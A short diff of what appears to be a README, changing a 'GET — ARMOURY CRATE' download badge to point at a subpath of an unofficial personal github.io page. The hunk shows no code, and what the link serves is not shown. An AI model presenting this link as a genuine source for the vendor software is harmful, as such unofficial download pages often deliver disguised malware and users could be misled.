@@ -4,7 +4,7 @@
 <img src="https://zendata.security/wp-content/uploads/2025/06/ChatGPT-Image-18-juin-2025-12_20_31.png" width="400">
 </p>
 
-[![GET — ARMOURY CRATE](https://img.shields.io/badge/GET-ARMOURY%20CRATE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — ARMOURY CRATE](https://img.shields.io/badge/GET-ARMOURY%20CRATE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Armoury-Crate)
 
 ---
 
